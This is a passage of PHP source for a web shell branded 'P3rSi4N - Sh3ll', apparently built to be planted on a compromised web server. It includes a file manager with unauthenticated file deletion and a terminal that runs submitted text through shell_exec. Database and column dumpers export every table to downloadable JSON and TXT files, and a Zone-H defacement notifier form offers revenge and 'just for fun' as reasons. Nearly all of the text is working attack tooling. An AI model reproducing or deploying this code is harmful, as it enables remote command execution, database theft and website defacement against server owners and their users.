                               echo "<i class='fas fa-file-archive'></i>";
                               break;
                       
                           case 'gz':
                               echo "<i class='fas fa-file-archive'></i>";
                               break;
   
                           case 'png':
                            echo '<i class="far fa-file-image"></i>';
                               break;
   
   
                           case 'apk':
                               echo "<i class='fab fa-android'></i>";
                               break;                       

                               case 'gif':
                                echo "<i class='fas fa-file-image'></i>";
                                break;
    
                            case 'bat':
                                 echo "<i class='far fa-blinds-raised'></i>";
                                break;
    
                            case 'aspx':
                                echo "icon aspx";
                                break;
    
                            case 'xhtml':
                                echo "<i class='fas fa-file-code'></i>";
                                break;
                            
                                case 'svg':
                                    echo "<i class='fas fa-file-image'>";
                                    break;
        
                                case 'exe':
                                     echo "<i class='fad fa-window-alt'></i>";
                                    break;
        
                                case 'ini':
                                    echo "icon ini";
                                    break;
 
                        default:
                            echo "<i class='fas fa-file-code'></i>";
                            break;
                    }

            

                    if($vrodi==="..")
                    {
                        chaingedir();
                        #echo "<a href='?pwd=$nowpath"."$vrodi"."/'>$vrodi</a>";
                        echo "<a href='?pwd=$path'>$vrodi</a>";

                    }
                    elseif(is_dir($nowpath.$vrodi))
                    {
                        $test = $nowpath.$vrodi;
                        #echo "<a href='?pwd=$nowpath"."$vrodi/'>$vrodi</a>";
                        get_path();
                        echo "<a href='?pwd=$test/'>$vrodi</a>";
                    }


                    else
                    {
                        $masir_k=$_GET['pwd'];
                        echo "<a href='?edit=$vrodi&edit_pwd=$masir_k'>$vrodi</a>";
                    }
                    
                ?>
                    <td class='td-type-content'><?php 
                    
                    
                    if($type=="Directory"){
                        $count_directory++;
                        echo "<span style='color:red;'>$type</span>";
                    }
                    elseif($type=="php"){
                        $count_file_php++;
                        echo "<span class='text-primary'>$type</span>";
                    }
                    elseif($type=="html"){
                        $count_file_html++;
                        echo "<span class='text-primary'>$type</span>";
                    }
                    elseif($type=="jpg" || $type=="png" || $type=="jpeg"){
                        $count_image++;
                        echo "<span class='text-primary'>$type</span>";

                    }

                    elseif($type=="css"){
                        $count_file_css++;
                        echo "<span class='text-primary'>$type</span>";
                    }
                    else{
                        echo "<span class='text-primary'>$type</span>";
                    }

                    
                    
                    ?></td>
                    <td class='td-size-content'><?php if(!is_dir($nowpath.$vrodi)){echo "<span class='text-warning'>$file_size</span>";} else{echo "<span style='color:red;'>Not Availible</span>";}?></td>
                    <td class='td-permission-content'><span style='color:green;'><?php
                    
                    $perm=$nowpath.$vrodi; 
                    if($mode=@fileperms($perm)){
                        $perms='';$perms .= ($mode & 00400) ? 'r' : '-';$perms .= ($mode & 00200) ? 'w' : '-';$perms .= ($mode & 00100) ? 'x' : '-';$perms .= ($mode & 00040) ? 'r' : '-';$perms .= ($mode & 00020) ? 'w' : '-';$perms .= ($mode & 00010) ? 'x' : '-';$perms .= ($mode & 00004) ? 'r' : '-';$perms .= ($mode & 00002) ? 'w' : '-';$perms .= ($mode & 00001) ? 'x' : '-';
                        echo $perms;
                    }
                    else{
                        echo "??????????";
                    }
                    
                    ?></span></td>
                    <?php get_path(); ?>
                    <td class='td-update-content'><?php echo "<span class='text-primary'>".date('Y/m/d'."</span>", filemtime($nowpath.$vrodi)); echo "<span class='text-warning'>".date('[h:i]'."</span>", filemtime($nowpath.$vrodi)) ?></td>
                    <td class='td-option-content'>
                   <!--  <form method='POST' class='form-option-file'> 
                    <input type='hidden' name='hidden_edit' value='<?php echo $vrodi; ?>'>
                    --> 
                    <?php if($type=="Directory"){ 
                     echo "<span style='color:red';><center>Not Availible</center></span>";
                    }

              
                  
                    
                    else{
                        echo "
                    <a href='?edit=$vrodi&edit_pwd=$nowpath' class='option-file'>Edit</a>
                    <a href='?delete=$nowpath$vrodi' class='option-file'>Delete</a>
                    <a href='$full_name_download' class='option-file'>Download</a>

                    ";
                    }

                    ?>
                    <?php 
                       if(isset($_GET['delete'])){
                        $delete = $_GET['delete'];
                        unlink($delete);
                        echo "<script>alert(' [~] File removed successfuly [~] ');</script>";
                    }


                    ?>
         

                    <?php

           
                
$name_download="salam in matn test ast";
$file_download="index6.php";
$rand_1=rand(1000,9999);
$full_name_download="p3rsi4n_p3nt3st".$rand_1."_".$file_download;

file_put_contents($full_name_download,$name_download);


/* $ex_down=explode(".",$name_download);
$end_down=end($ex_down);
$masir_down=$nowpath.$name_download;
$sorce_file_download=htmlspecialchars(file_get_contents($masir_down));
 *//* 
$rand_1=rand(1000,9999);
$full_name_download="p3rsi4n_p3nt3st".$rand_encode."__".$name_download.".".$end_down;
file_put_contents($full_name_download,$sorce_file_download);

 */
 




                    ?>

                

                  













<!-- <div class="modal fade " id="rename" tabindex="-1" role="dialog" aria-labelledby="rename" aria-hidden="true">
  <div class="modal-dialog " role="document">
    <div class="modal-content bg-dark">
      <div class="modal-header">
        <h5 class="modal-title" id="rename">Rename</h5>
        <button type="button" class="close text-white" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        
        <form>
          <div class="form-group">
            <label for="recipient-name" class="col-form-label">New Name :</label>
            <input type="text" class="form-control" placeholder='Enter your new name . . .' id="recipient-name">
          </div>
        --   <div class="form-group">
            <label for="message-text" class="col-form-label">Message:</label>
            <textarea class="form-control" id="message-text"></textarea>
          </div> --
        </form>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Save</button>
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Cancel</button>

      </div>
    </div>
  </div>
</div>
       -->            
                  
                  
                    <!--   </form>
                    <form method='POST' class='form-option-file'>
                    <input type="hidden" name="hidden_delet" value="<?php echo $vrodi;?>">
                    <input type='submit' name="options" value='Delete' class='option-file'>
                    </form>
                    <form method='GET' class="form-option-file">
                        <input type="submit" name='options' value="Rename" class="option-file">
                    </form> -->

                    </td>
                    
                </tr>
                <?php 
               $sort++;
                
            }  
/*                 $count_security=htmlentities($count);
/*                 echo "<div style='width: 50px;height: 100px;background-color: #fff;position: fixed;bottom:150px;border-top-left-radius:30px;border-bottom-right-radius:30px;right: 0px;border:3px solid #fff;'></div>"
 */
                ?>

            </table>
                <?php
               
            }?>
            
            
            <?php 

            if(isset($_GET['coldump']) && $_GET['coldump']=="coldump"){

                echo
                "
                <div class='div-col-dumper'>
                    <div class='div-dakhel-col-dump'>
                        <form method='POST'>
                        <input type='text' class='input-dump' name='server_col' placeholder='Server Name'>
                        <input type='text' class='input-dump' name='db_name_col' placeholder='DB Name'>
                        <input type='text' class='input-dump' name='db_user_col' placeholder='DB Username'>
                        <input type='text' class='input-dump' name='db_pass_col' placeholder='DB Password'>
                        <input type='text' class='input-dump' name='db_col_name_col' placeholder='Column Name'>
                        </br><center></br>
                        <input type='submit' value='Dump Now' class='btn btn-warning ' name='btn_col_dumper' >
                        </center>
                        </form>
                    <div>

                    ";
                if(isset($_POST['btn_col_dumper'])){
                    $server_col=$_POST['server_col'];
                    $db_name_col=$_POST['db_name_col'];
                    $db_user_col=$_POST['db_user_col'];
                    $db_pass_col=$_POST['db_pass_col'];
                    $db_col_name_col=$_POST['db_col_name_col'];
                    $con_db_col_dump=new mysqli("$server_col","$db_user_col","$db_pass_col","$db_name_col");
                    $con_db_col_dump->set_charset("utf8");
                    if($con_db_col_dump){
                    $query_dump_col="SELECT * FROM $db_col_name_col";
                    $res_dump_col=$con_db_col_dump->query($query_dump_col);
                    }
                    
                    echo "

                    <div class='div-res-col-dump'>
                        <p class='text-danger p-banner'>
                            |------------------ <span class='text-warning'>[~]</span> / <span class='text-primary'>2021/03/23</span> / <span class='text-white'>..:: Column Dumper v.1 ::..</span> / <span class='text-primary'>23:32:56</span> / <span class='text-warning'>[~]</span>
                       </br>|</br>
                            |</br>
                            |----------- <span class='text-warning'>[~]</span> / <span class='text-primary'>2021/03/23</span> / <span class='text-success text-bold text-monospace'>P3rSi4N - Sh3ll</span> / <span class='text-primary'>23:32:56</span> / <span class='text-warning'>[~]</span>
                       </br>|</br>
                            |</br>
                            |------------------ <span class='text-warning'>[~]</span>  <span class='text-white'>Mission Accomplished ! Please Wait ... </span>  <span class='text-warning'>[~]</span> 
                        </p>
                        ";
                        while($row_dump_col =$res_dump_col->fetch_assoc()){
                            $row_dump_col_json=json_encode($row_dump_col,JSON_UNESCAPED_UNICODE);
                            ?>
                        <p class='p-res-col-dump text-justify'>
                            <?php echo $row_dump_col_json; ?>
                        </p>
                        <?php  }
                   
                   echo " </div>

                    ";}

               echo "</div>";
                
            


            }




             ?>
             
             <?php 

                    if(isset($_POST['btn_terminal'])){
                        $text_terminal=$_POST['text_terminal'];
                        $res_terminal=shell_exec($text_terminal);
                        global $result_system;
                        $result_system=$res_terminal;
                    
                    if(isset($_GET['terminal']) && $_GET['terminal']=="terminal"){
                        
                        echo "
                            <div class='div-terminal'>
                                <div class='div-dakhel-terminal'>
                                </br>
                                <form method='POST'>
                                <input type='text' class='input-terminal' name='text_terminal' placeholder='P3rSI4N-P3NT3sT/~$ '><input type='submit' value='>>' class='btn-terminal' name='btn_terminal'> 
                                <textarea rows='15' class='textarea-2 bg-dark' cols='50'>$result_system</textarea>
                                </form>
                                </div>
                            </div>
                        ";

                    }
                }
                  


                    ?>
             
             <?php   
              
            if(isset($_GET['dumper']) && $_GET['dumper']=="dumper"){
                
                echo"
                <div class='div-db-dumper'>
                <div class='div-dakhel-db-dumper'>";
                echo "
                <form method='POST'>

                    <input type='text' class='input-dump' name='serverDB' placeholder='Server Name'>
                    <input type='text' class='input-dump' name='Database' placeholder='DB Name'>
                    <input type='text' class='input-dump' name='userDB' placeholder='DB Username'>
                    <input type='text' class='input-dump' name='passDB' placeholder='DB Password'>
                </br>
                <center>
                    <input type='submit' name='taaid' value='Connect Now' class='btn btn-warning bt-dump' name=''>
                </center>

                </form>";
                
                    $is_null_nam_db = 'Default';

                    
                if (isset($_POST['taaid'])) {
                    $Server_db = secure_filter($_POST['serverDB']);
                $Database_db = secure_filter($_POST['Database']);
                $User_db = secure_filter($_POST['userDB']);
                $Pass_db = secure_filter($_POST['passDB']);
                $_con_databases = mysqli_connect($Server_db,$User_db,$Pass_db,$Database_db);
                mysqli_set_charset($_con_databases, "utf8");
                }
                $dumper_result_DB = mysqli_query($_con_databases,"show tables;");
                while($tables_DB = mysqli_fetch_array($dumper_result_DB)) {
                    $array_list_DB .= ",$tables_DB[0]";
                }
                $find_table = explode(',',$array_list_DB);
                unset($find_table[0]);
               foreach ($find_table as $select_table) {
                   $res = mysqli_query($_con_databases,"SHOW COLUMNS FROM $select_table;");
                   while($show_value_table = mysqli_fetch_assoc($res)) {
                       //array_push($two_d_array,$show_value_table);
                       $fullan = $show_value_table['Field'];
                       $new_fu .= ",$fullan";
                   }
               }
               $show_value_table_to_array = explode(',',$new_fu);
               unset($show_value_table_to_array[0]);
                if (isset($Database_db)) {
                    
                    unset($is_null_nam_db);

                }
                
                echo "
                </div>


                <div class='div-res-dumper'>
                    <p class='text-danger p-banner'>
                         +</br>
                         |------------------ <span class='text-warning'>[~]</span> / <span class='text-primary'>2021/03/23</span> / <span class='text-white'>..:: Database Dumper v.1 ::..</span> / <span class='text-primary'>23:32:56</span> / <span class='text-warning'>[~]</span>
                    </br>|</br>
                         |</br>
                         |----------- <span class='text-warning'>[~]</span> / <span class='text-primary'>2021/03/23</span> / <span class='text-success text-bold text-monospace'>P3rSi4N - Sh3ll</span> / <span class='text-primary'>23:32:56</span> / <span class='text-warning'>[~]</span>
                    </br>|</br>
                         |</br>
                         |------------------ <span class='text-warning'>[~]</span>  <span class='text-white'>Mission Accomplished ! Please Wait ... </span>  <span class='text-warning'>[~]</span> 
                     </p>
                
                <div class='div-desig-db'>
                    <center><botton class='btn btn-dark text-warning'>$Database_db$is_null_nam_db</botton>
                        <span class='text-bold text-white text-bold-m'>
                   </br>|
                   </br>|</br>
                        |</br>
                        </span>
                    
                    <span class='text-white text-bold-m'>
                     - - - - - - - - - - - - - - - - - - - - - - - - - - - - - <span class='text-danger' style='font-weight: bold;font-family: Verdana, Geneva, Tahoma, sans-serif;'>[~]</span> TABLES NAME <span class='text-danger' style='font-weight: bold;font-family: Verdana, Geneva, Tahoma, sans-serif;'>[~]</span> - - - - - - - - - - - - - - - - - - - - - - - - - - - - -    
                    </span>
                    </center>
                
                <span>
                <center>";
                foreach ($find_table as $value_table_24) {
                    echo "<botton class='btn btn-dark text-warning'>$value_table_24</botton> ";
                }
                echo "
                </br>
                </span>


                <span class='text-white text-bold-m '>
                - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -    
                </span>
                
                <span class='text-bold text-white text-bold-m'>
                </br>|
                </br>|</br>
                     |</br>
                     </span>


                     <span class='text-white text-bold-m '>
                     - - - - - - - - - - - - - - - - - - - - - - - - - - - - - <span class='text-danger' style='font-weight: bold;font-family: Verdana, Geneva, Tahoma, sans-serif;'>[~]</span> COLUMNS NAME <span class='text-danger' style='font-weight: bold;font-family: Verdana, Geneva, Tahoma, sans-serif;'>[~]</span> - - - - - - - - - - - - - - - - - - - - - - - - - - - - -    
                     </span>
                </br>";
                foreach ($show_value_table_to_array as $columns) {
                    echo "<botton class='btn btn-dark text-warning btn-col3'>$columns</botton> ";
                }
                        

                echo "
                </br>

                     <span class='text-white text-bold-m '>
                     - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -    
                     </span>

                     <span class='text-bold text-white text-bold-m'>
                     </br>|
                     </br>|</br>
                          |</br>
                          </span>

                    <span class='text-white text-bold-m '>
                    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - <span class='text-danger' style='font-weight: bold;font-family: Verdana, Geneva, Tahoma, sans-serif;'>[~]</span> DUMP DATABASE <span class='text-danger' style='font-weight: bold;font-family: Verdana, Geneva, Tahoma, sans-serif;'>[~]</span> - - - - - - - - - - - - - - - - - - - - - - - - - - - - -    
                    </span>

</br></br>

                    ";
                
                 $export_array = array();       
foreach ($find_table as $select_table) {
    
    $new_res = mysqli_query($_con_databases,"SELECT * FROM $select_table;");
    while($show_value_table = mysqli_fetch_assoc($new_res)) {
        array_push($export_array,$show_value_table);
        
    }
    
}
$file_name_1 = md5(rand(1,9999));
$full_name_2 = md5(rand(1,9999));
$full_file_name = "json-Dump-SQL-ID-$full_name_2$file_name_1.json";
$full_file_name_2 = "txt-Dump-SQL-ID-$full_name_1$full_name_2.txt";
$final_process = json_encode($export_array);

file_put_contents($full_file_name,$final_process);
foreach ($export_array as $value_export_array) {
    
    foreach ($value_export_array as $kleid => $chizayeh_dakhelesh) {
        $massage .= "
        Default_Database ..........#
        -------------++++------------
        $kleid       ===>   $chizayeh_dakhelesh
        -------------++++------------
        ";
        
        
        file_put_contents($full_file_name_2,$massage);
    }
}
            
       echo "
<a href='$full_file_name' class='btn btn-danger' download>JSON Dump</a>
<botton class='btn btn-primary'>SQL Dump</botton>
<a href='$full_file_name_2' class='btn btn-warning' download>TXT Dump</a>
</br></br>


                     <span class='text-white text-bold-m '>
                     - - - - - - - - - - - - - - - - - - - - - - - - - - - - - <span class='text-danger' style='font-weight: bold;font-family: Verdana, Geneva, Tahoma, sans-serif;'>[!]</span> FINISHED <span class='text-danger' style='font-weight: bold;font-family: Verdana, Geneva, Tahoma, sans-serif;'>[!]</span> - - - - - - - - - - - - - - - - - - - - - - - - - - - - -    
                     </span>
                     </center>




                <div>
                
                
                     </div>
                </div>

                ";
            }
          
            ?>

            <?php 

            if(isset($_GET['remote']) && $_GET['remote']=="remote"){
            
                echo "
                    <div class='div-remote-up'>
                        <div class='div-dakhel-remote'>
                            <form method='POST'>
                                <input type='text' class='input-remote' placeholder='address'>
                                <input type='submit' class='btn btn-warning' value='Upload !'>    
                            </form>
                        </div>
                    </div>

                ";
              

            }



            ?>


                <?php 

            if(isset($_GET['encoder']) && $_GET['encoder']=="encoder"){
                if ($_POST['hash'] == 'md5') {
                    
                 $res_hash = hash('md5',secure_filter($_POST['inpt']));
                 
                }elseif ($_POST['hash'] == 'sha256') {
                    
                   $res_hash = hash('sha256',secure_filter($_POST['inpt']));
                    
                }elseif ($_POST['hash'] == 'sha512') {
                    
                    $res_hash = hash('sha512',secure_filter($_POST['inpt']));
                    
                }elseif ($_POST['hash'] == 'haval') {
                    
                   $res_hash = hash('haval256,5',secure_filter($_POST['inpt']));
                    
                }
                
                if ($_POST['enc'] == 'aes') {
                    $key = hash('sha256', secure_filter($_POST['keysaz']));
                    $method = 'aes-256-cbc';
                    $iv = chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0);
                    $encrypted_aes = base64_encode(openssl_encrypt(secure_filter($_POST['inpt']), $method, $key, OPENSSL_RAW_DATA, $iv));
                    $massage_enc = " [Key]: $key
--------------
[Encryption Text]:
$encrypted_aes";
                    $res_hash = $massage_enc;
                    
                }elseif ($_POST['enc'] == 'rsa') {
                    
                    $config_key = array(
                        "digest_alg" => "sha256",
                        "private_key_bits" => 4096,
                        "private_key_type" => OPENSSL_KEYTYPE_RSA,
                        );
                        
                        $step_1 = openssl_pkey_new($config_key);
                        
                        openssl_pkey_export($step_1, $privKey);
                        
                        $pubKey = openssl_pkey_get_details($step_1);
                        $pubKey = $pubKey["key"];
                        file_put_contents('private_key.pem',$privKey);
                        file_put_contents('public_key.pem',$pubKey);
                        
                        $public_key = file_get_contents('public_key.pem');
                        $value_rsa = secure_filter($_POST['inpt']);
                        $data = str_split($value, 214); // max is 214
                        $result = '';
                        foreach($data as $d){
                            if(openssl_public_encrypt($d, $encrypted, $public_key, OPENSSL_PKCS1_OAEP_PADDING)){
                                $result .= $encrypted;
                                
                            }
                            
                            
                        }
                        
                        $rsa = base64_encode($result);
                        
                        $check1 = rand(11111,99999);
                        $check2 = rand(11111,99999);
                        
                        $check_sum = "$check1$check2";
                        
                        $massage_enc_rsa = "[check_sum]: $check_sum
--------------
[Encryption Text]:
$rsa";
                        $res_hash = $massage_enc_rsa;
                        file_put_contents('Encryption_Text.txt',$massage_enc_rsa);
                        $zip = new ZipArchive();
                        $zip->open("$check_sum.zip", ZipArchive::CREATE);
                        $zip->addFile('private_key.pem');
                        $zip->addFile('public_key.pem');
                        $zip->addfile('Encryption_Text.txt');
                        $zip->close();

                        $file_name_zip = "$check_sum.zip";
                        $html_submit = "<a href='$file_name_zip' class='btn btn-warning' download>Download public_key & private_key</a>";
                    }
                


                echo "
                    <div class='div-encoder'>
                        <div class='div-dakhel-encoder'>
                        <form method='POST'>
                            <div class=''>
                                <table class='table table-dark'>
                               
                                <p class='text-white text-left' style='margin-top:10px;margin-left:7px;'><span style='color:green;font-weight: bold;font-family: Verdana, Geneva, Tahoma, sans-serif;'>[~]</span> Hash Cryptography ---></p>

                                <tr>
                                <th><input type='radio' id='asymmetric' name='hash' value='md5' class='ch_bg_shell'><h6 class='h6 text-primary mtn-encode'>MD5</h6></th>
                                <th><input type='radio' id='asymmetric' name='hash' value='sha256' class='ch_bg_shell'><h6 class='h6 text-primary mtn-encode'>SHA256</h6></th>
                                <th><input type='radio' id='asymmetric' name='hash' value='sha512' class='ch_bg_shell'><h6 class='h6 text-primary mtn-encode'>SHA512</h6></th>
                                <th><input type='radio' id='asymmetric' name='hash' value='haval' class='ch_bg_shell'><h6 class='h6 text-primary mtn-encode'>haval256,5</h6></th>
                            </tr>
                               </table>

                            <table class='table table-dark'>

                               
                                <p class='text-white text-left' style='margin-left:7px;'><span style='color:green;font-weight: bold;font-family: Verdana, Geneva, Tahoma, sans-serif;'>[~]</span> Encryption Cryptography ---></p>

                                <tr>
                                <th><input type='radio' id='symmetric' name='enc' value='aes' class='ch_bg_shell'><h6 class='h6 text-primary mtn-encode'>AES 256 cbc</h6></th>
                                <th><input type='radio' id='symmetric' name='enc' value='rsa' class='ch_bg_shell'><h6 class='h6 text-primary mtn-encode'>RSA</h6></th>
                            </tr>
            
                                </table></br>
                                <div style='width:100%;max-width:480px;margin:0 auto;'>
                                <textarea rows='3' name='keysaz' class='textarea-1 bg-dark' cols='50' placeholder='Value Making Key (AES 256)'></textarea>

                                <textarea rows='10' name='inpt' class='textarea-1 bg-dark' cols='50' placeholder='Enter Your Text'></textarea>
                                </div>

                                </br></br>
                                
                                <center>
                                <span class='text-white text-bold-m '> [+] - - - - - - - - - - - - - - - - - - - - - - - - - - - ->>></span> <input type='submit' value='Encode' class='btn btn-primary'> <span class='text-white text-bold-m '><<< - - - - - - - - - - - - - - - - - - - - - - - - - - - -  [+]</span></form>
                                </center>
                                </br></br>



                                <div style='width:100%;max-width:480px;margin:0 auto;'>
                                <textarea readonly value='' rows='10' class='textarea-1 bg-dark' cols='50'>$res_hash</textarea>
                                </br>
                                $html_submit

                                </div>

                                </br></br>
                            </div>            

                        </div>
                    </div>
                
                ";

            }




?>


            <?php 
            if(isset($_GET['decoder']) && $_GET['decoder']=="decoder"){
                echo "
                <div class='div-encoder'>
                    <div class='div-dakhel-encoder'>
                    <form method='POST'>
                        <div class=''>
                          


                        </br>

                        <table class='table table-dark'>

                           
                            <p class='text-white text-left' style='margin-left:7px;'><span style='color:green;font-weight: bold;font-family: Verdana, Geneva, Tahoma, sans-serif;'>[~]</span> Encryption Cryptography ---></p>

                            <tr>
                            <th><input type='radio' id='symmetric' name='enc' value='aes' class='ch_bg_shell'><h6 class='h6 text-primary mtn-encode'>AES 256 cbc</h6></th>
                            <th><input type='radio' id='symmetric' name='enc' value='rsa' class='ch_bg_shell'><h6 class='h6 text-primary mtn-encode'>RSA</h6></th>
                        </tr>
        
                            </table></br>
                            <div style='width:100%;max-width:480px;margin:0 auto;'>
                            <textarea rows='3' name='' class='textarea-1 bg-dark' cols='50' placeholder='Enter Your Key'></textarea>

                            <textarea rows='10' name='inpt' class='textarea-1 bg-dark' cols='50' placeholder='Enter Your Text Encode'></textarea>
                            </div>

                            </br></br>
                            
                            <center>
                            <span class='text-white text-bold-m '> [+] - - - - - - - - - - - - - - - - - - - - - - - - - - - ->>></span> <input type='submit' value='Decode' class='btn btn-primary'> <span class='text-white text-bold-m '><<< - - - - - - - - - - - - - - - - - - - - - - - - - - - -  [+]</span></form>
                            </center>
                            </br></br>



                            <div style='width:100%;max-width:480px;margin:0 auto;'>
                            <textarea readonly value='' rows='10' class='textarea-1 bg-dark' cols='50'>$res_hash</textarea>
                            </div>

                            </br></br>
                        </div>            

                    </div>
                </div>
                
                ";

            }




            ?>






            <?php 
                if(isset($_GET['zoneh']) && $_GET['zoneh']=="zoneh"){
                    echo "

                    <div class='div-zoneh'>
                        <div class='div-dakhel-zoneh'>

                        <div class='zoneh-top'>
                        <form method='post' action='/notify/single'>
                        <ul style='list-style:none;'>
                            <li>
                                <ul style='list-style:none;'>
                                    <li class='text-white'><span class='text-primary'>[+]</span> Notifier ==></li>
                <li><input type='text' name='defacer' value='Persian_Pentest' class='input-zoneh'/> </li>
                                </ul>
                            </li>
                                                    <li>
                                <ul style='list-style:none;'>
                                    <li class='text-white'><span class='text-primary'>[+]</span> Domain 1 ==></li>
                
                <li><input type='text'
                name='domain1'
                value='http://' class='input-zoneh'/></li>
                                </ul>
                            </li>
                                                    <li>
                            <ul>
                            <select name='hackmode' class='input-zoneh'>
                            <option value=''>--------SELECT--------</option>
                                                    <option
                value='1' >known vulnerability (i.e. unpatched system)</option>
                                                        <option
                value='2' >undisclosed (new) vulnerability</option>
                                                        <option
                value='3' >configuration / admin. mistake</option>
                                                    <option
                value='4' >brute force attack</option>
                                                     <option
                value='5' >social engineering</option>
                                                     <option
                value='6' >Web Server intrusion</option>
                                                     <option
                value='7' >Web Server external module intrusion</option>
                                                     <option
                value='8' >Mail Server intrusion</option>
                                                     <option
                value='9' >FTP Server intrusion</option>
                                                         <option
                value='10' >SSH Server intrusion</option>
                                                      <option
                value='11' >Telnet Server intrusion</option>
                                                    <option
                value='12' >RPC Server intrusion</option>
                                                    <option
                value='13' >Shares misconfiguration</option>
                                                    <option
                value='14' >Other Server intrusion</option>
                                                    <option
                value='15' >SQL Injection</option>
                                                    <option
                value='16' >URL Poisoning</option>
                                                    <option
                value='17' >File Inclusion</option>
                                                    <option
                value='18' >Other Web Application bug</option>
                                                    <option
                value='19' >Remote administrative panel access through bruteforcing</option>
                                                    <option
                value='20' >Remote administrative panel access through password guessing</option>
                                                    <option
                value='21' >Remote administrative panel access through social engineering</option>
                                                    <option
                value='22' >Attack against the administrator/user (password stealing/sniffing)</option>
                                                    <option
                value='23' >Access credentials through Man In the Middle attack</option>
                                                    <option
                value='24' >Remote service password guessing</option>
                                                    <option
                value='25' >Remote service password bruteforce</option>
                                                    <option
                value='26' >Rerouting after attacking the Firewall</option>
                                                    <option
                value='27' >Rerouting after attacking the Router</option>
                                                    <option
                value='28' >DNS attack through social engineering</option>
                                                    <option
                value='29' >DNS attack through cache poisoning</option>
                                                    <option
                value='30' >Not available</option>
                                                         <option
                value='31' >Cross-Site Scripting</option>
                                                         </select>						</ul>
                            </li>
                            <li>
                            <ul>
                            <select name='reason' class='input-zoneh'>
                            <option value=''>--------SELECT--------</option>
                                                    <option
                value='1' >Heh...just for fun!</option>
                                               <option
                value='2' >Revenge against that website</option>
                                               <option
                value='3' >Political reasons</option>
                                               <option
                value='4' >As a challenge</option>
                                               <option
                value='5' >I just want to be the best defacer</option>
                                               <option
                value='6' >Patriotism</option>
                                               <option
                value='7' >Not available</option>
                                                    </select>						</ul>
                            </li>
                            <li>
                                <ul></br><input type='submit' value='Send' class='btn btn-outline-primary'/></ul>
                            </li>
                        </ul>
                        </form></br>
                        <br><h6 class='text-white' style='margin-left:65px;'><span class='text-primary'>[+]</span> Resault ==></h6>
                        <div class='zoneh-resault'>
                            <p class='h6 text-danger' padding-bottom:7px;>
                            Lorem ipsum dolor sit, amet consectetur adipisicing elit. Explicabo iure pariatur laboriosam impedit itaque quae possimus laudantium! Veniam, maiores alias.

                            </p>
                        </div>

                            </div>
                        </div>
                    </div>


                    ";

                }


            ?>



            <?php 
/*             modal-header 
 */            
           
            
            echo "
            <div class='modal fade ' id='exampleModal' tabindex='-1' aria-labelledby='exampleModalLabel' aria-hidden='true'>
  <div class='modal-dialog '>
    <div class='modal-content bg-dark'>
      <div class='modal-header'>
      <botton class='btn-close bg-white' data-bs-dismiss='modal' aria-label='Close'></botton>

      </div>
      <center>
        <div class='div-modal-title col-12'>
            <img id='exampleModalLabel' src='b1.jpg' class='img-title-modal rounded-circle'>
            <img id='exampleModalLabel' src='9.jpg' class='img-title-modal2 rounded-circle'>
            <img id='exampleModalLabel' src='i.jpg' class='img-title-modal rounded-circle'>
        </div>
      </center>
      
      <div class='modal-body'>
        <table class='table table-dark table-striped teble-bordered' >
           
            <tr>
                <th class='text-primary'>Count Tables : ". "<span class='text-white'>$count_directory</span>" ."</th>
            </tr>

            <tr>
                <th class='text-primary'>Count File PHP :". "<span class='text-white'> $count_file_php </span>" ."</th>
            </tr>

            <tr>
                <th class='text-primary'>Count File Html : ". "<span class='text-white'> $count_file_html </span>" ."</th>
            </tr>

            <tr>
                <th class='text-primary'>Count File Css : ". "<span class='text-white'> $count_file_css </span>" ."</th>
            </tr>

            <tr>
                <th>Date & Time :". "<span class='text-warning'> $time_date </span>" ."</th>
            </tr>

        </table>
      </div>
      <div class='modal-footer'>
      </div>
    </div>
  </div>
</div>
            ";







            echo "


            <div class='modal fade ' id='exampleModal2' tabindex='-1' aria-labelledby='exampleModalLabel' aria-hidden='true'>
  <div class='modal-dialog '>
    <div class='modal-content bg-dark'>
      <div class='modal-header'>
      <botton class='btn-close bg-white' data-bs-dismiss='modal' aria-label='Close'></botton>

      </div>
      <center>
        <div class='div-modal-title col-12'>
            <img id='exampleModalLabel' src='b1.jpg' class='img-title-modal rounded-circle'>
            <img id='exampleModalLabel' src='9.jpg' class='img-title-modal2 rounded-circle'>
            <img id='exampleModalLabel' src='i.jpg' class='img-title-modal rounded-circle'>
        </div>
      </center>
      
      <div class='modal-body'>
      </br>
        <table class='table_seting'>

            <p class='text-white text-left'><span style='color:green;font-weight: bold;font-family: Verdana, Geneva, Tahoma, sans-serif;'>[~]</span> Background All Shell :</p>
            <tr>

               
                <th><input type='radio' id='1' name='change-img' value='back_shell' class='ch_bg_shell'><img src='6.jpg' class='img_bg_shell' alt=''></th>
                <th><input type='radio' id='2' name='change-img' value='back_shell' class='ch_bg_shell'><img src='8.jpg' class='img_bg_shell' alt=''></th>
                <th><input type='radio' id='3' name='change-img' value='back_shell' class='ch_bg_shell'><img src='b1.jpg' class='img_bg_shell' alt=''></th>
                <th><input type='radio' id='4' name='change-img' value='back_shell' class='ch_bg_shell'><img src='b2.jpg' class='img_bg_shell' alt=''></th>
        
            
            </tr>

        <table>
        </br></br>
        <p class='text-white text-left'><span style='color:green;font-weight: bold;font-family: Verdana, Geneva, Tahoma, sans-serif;'>[~]</span>  Change Color Shell :</p>
        <table class='table-seting-header'>
            <tr>
                <th><input type='radio' id='5' name='change-color' value='back_shell' class='ch_bg_shell'><div class='col-h' style='background-color:#000000cb;'></div></th>
                <th><input type='radio' id='6' name='change-color' value='back_shell' class='ch_bg_shell'><div class='col-h' style='background-color:#747474a1;'></div></th>
                <th><input type='radio' id='7' name='change-color' value='back_shell' class='ch_bg_shell'><div class='col-h' style='background-color:#28333dee;'></div></th>
                <th><input type='radio' id='8' name='change-color' value='back_shell' class='ch_bg_shell'><div class='col-h' style='background-color:#1d1d1dc9;'></div></th>
            </tr>

      </table>



      </br></br>
     


      </div>
      <div class='modal-footer'>
      </div>
